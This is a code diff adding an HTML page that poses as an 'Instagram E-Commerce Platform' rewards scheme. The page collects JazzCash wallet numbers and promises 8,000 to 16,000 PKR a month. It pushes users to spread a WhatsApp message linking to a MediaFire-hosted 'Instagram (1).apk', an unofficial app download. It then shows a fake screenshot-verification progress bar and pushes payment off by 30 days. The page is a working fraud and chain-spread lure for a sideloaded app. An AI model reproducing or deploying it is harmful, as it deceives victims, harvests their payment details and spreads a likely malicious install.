@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Instagram E-Commerce Platform</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap" rel="stylesheet">
+
+<style>
+:root{
+  --dark-neon:#111;        /* For text outline/glow */
+  --pink:#ff2bdc;
+  --blue:#00f7ff;
+  --purple:#9b5cff;
+  --green:#00ff9d;
+}
+
+html,body{
+  margin:0;
+  padding:0;
+  min-height:100vh;
+  font-family:'Orbitron',sans-serif;
+  background:
+    linear-gradient(rgba(255,255,255,0.3), rgba(255,255,255,0.3)),
+    url("background.jpg") no-repeat center center fixed;
+  background-size:cover;
+}
+
+/* Card */
+.card{
+  width:94%;
+  max-width:440px;
+  margin:6vh auto;
+  padding:28px;
+  border-radius:26px;
+  background:rgba(255,255,255,0.85);
+  box-shadow:0 0 25px var(--purple),0 0 55px rgba(155,92,255,.25);
+}
+
+/* Heading */
+.title{
+  text-align:center;
+  font-size:26px;
+  font-weight:800;
+  color:#000;
+  text-shadow:
+    0 0 6px var(--dark-neon),
+    0 0 10px var(--dark-neon),
+    0 0 15px var(--dark-neon),
+    0 0 25px var(--pink);
+  animation:pulse 2.5s infinite alternate;
+}
+
+@keyframes pulse{
+  from{filter:drop-shadow(0 0 8px var(--dark-neon))}
+  to{filter:drop-shadow(0 0 18px var(--pink))}
+}
+
+.subtitle{
+  text-align:center;
+  font-size:12px;
+  color:#000;
+  margin:10px 0 22px;
+  text-shadow:0 0 4px var(--dark-neon);
+}
+
+input{
+  width:100%;
+  padding:14px;
+  margin-top:14px;
+  background:#fdfdfd;
+  border:1px solid var(--blue);
+  border-radius:12px;
+  color:#111;
+  box-shadow:0 0 12px rgba(0,0,0,.15);
+}
+
+button{
+  width:100%;
+  padding:15px;
+  margin-top:16px;
+  border:none;
+  border-radius:14px;
+  font-size:14px;
+  color:#fff;
+  cursor:pointer;
+  background:linear-gradient(45deg,var(--pink),var(--purple));
+  box-shadow:0 0 20px var(--pink);
+}
+
+.whatsapp{
+  background:linear-gradient(45deg,#00ff9d,#00c853);
+  box-shadow:0 0 25px #00ff9d;
+}
+
+.message{
+  margin-top:18px;
+  font-size:13px;
+  line-height:1.7;
+  color:#000;
+  text-shadow:0 0 6px var(--dark-neon);
+}
+
+/* Screenshot Upload Box */
+.upload-box{
+  margin-top:16px;
+  padding:18px;
+  border-radius:16px;
+  border:2px dashed var(--blue);
+  text-align:center;
+  box-shadow:0 0 12px rgba(0,0,0,.2);
+}
+
+#preview{
+  display:none;
+  width:100%;
+  margin-top:14px;
+  border-radius:14px;
+  box-shadow:0 0 25px var(--blue);
+}
+
+/* Progress Bar */
+.progress{
+  display:none;
+  margin-top:14px;
+  width:100%;
+  height:14px;
+  background:#eee;
+  border-radius:10px;
+  overflow:hidden;
+}
+.bar{
+  height:100%;
+  width:0%;
+  background:linear-gradient(90deg,var(--pink),var(--green));
+  box-shadow:0 0 15px var(--green);
+  transition:width .4s;
+}
+
+/* Disclaimer */
+.note{
+  margin-top:22px;
+  font-size:11px;
+  color:#000;
+  text-align:center;
+  border-top:1px solid rgba(0,0,0,.1);
+  padding-top:14px;
+}
+.note b{color:var(--blue)}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <div class="title">Welcome Instagram E-Commerce Platform</div>
+  <div class="subtitle">
+    Just enter your JazzCash for registration<br>
+    and share with your friends
+  </div>
+
+  <input type="text" id="jazz" placeholder="Enter your JazzCash number">
+
+  <button onclick="register()">Register & Verify</button>
+
+  <div class="message" id="msg"></div>
+
+  <a id="wa" target="_blank" style="display:none">
+    <button class="whatsapp">Share with Friends</button>
+  </a>
+
+  <div class="upload-box">
+    <input type="file" id="shot" accept="image/*" disabled onchange="preview()">
+    <img id="preview">
+  </div>
+
+  <div class="progress" id="progress">
+    <div class="bar" id="bar"></div>
+  </div>
+
+  <button id="submit" disabled onclick="submitShot()">Submit Screenshot</button>
+
+  <div class="note">
+    ⚠️ Disclaimer:<br>
+    Only genuine sharing and real screenshots are accepted.<br>
+    Fake or edited screenshots may result in removal of displayed credit.<br>
+    Monthly display: <b>8,000 PKR</b> → after sharing: <b>16,000 PKR</b> (subject to review).
+  </div>
+</div>
+
+<script>
+function register(){
+  const num=document.getElementById("jazz").value.trim();
+  const msg=document.getElementById("msg");
+
+  if(num.length!==11 || isNaN(num)){
+    msg.style.color="#ff4d4d";
+    msg.innerHTML="❌ Invalid JazzCash number";
+    return;
+  }
+
+  msg.style.color="#111";
+  msg.innerHTML=
+    "✔ Registration successful<br>" +
+    "📢 Share in 9 WhatsApp groups & 10 friends<br>" +
+    "💰 Monthly: 8,000 PKR → After sharing: 16,000 PKR";
+
+  document.getElementById("wa").href=
+    "https://wa.me/?text=" +
+    encodeURIComponent("Instagram E-Commerce Rewards App\nDownload:\nhttps://www.mediafire.com/file/urc3yvs1euar462/Instagram+(1).apk/file");
+
+  document.getElementById("wa").style.display="block";
+  document.getElementById("shot").disabled=false;
+  document.getElementById("submit").disabled=false;
+}
+
+function preview(){
+  const file=document.getElementById("shot").files[0];
+  if(!file)return;
+  const reader=new FileReader();
+  reader.onload=e=>{
+    const p=document.getElementById("preview");
+    p.src=e.target.result;
+    p.style.display="block";
+  };
+  reader.readAsDataURL(file);
+}
+
+function submitShot(){
+  const bar=document.getElementById("bar");
+  const prog=document.getElementById("progress");
+  const msg=document.getElementById("msg");
+
+  prog.style.display="block";
+  bar.style.width="0%";
+
+  let percent=0;
+  const timer=setInterval(()=>{
+    percent+=10;
+    bar.style.width=percent+"%";
+    if(percent>=100){
+      clearInterval(timer);
+      msg.style.color="#00ff9d";
+      msg.innerHTML=
+        "🎉 Processing 100% Completed<br>" +
+        "✅ Screenshot verified successfully<br>" +
+        "⏳ Credit review timeline: up to 30 days";
+    }
+  },300);
+
+  document.getElementById("submit").disabled=true;
+}
+</script>
+
+</body>
+</html>
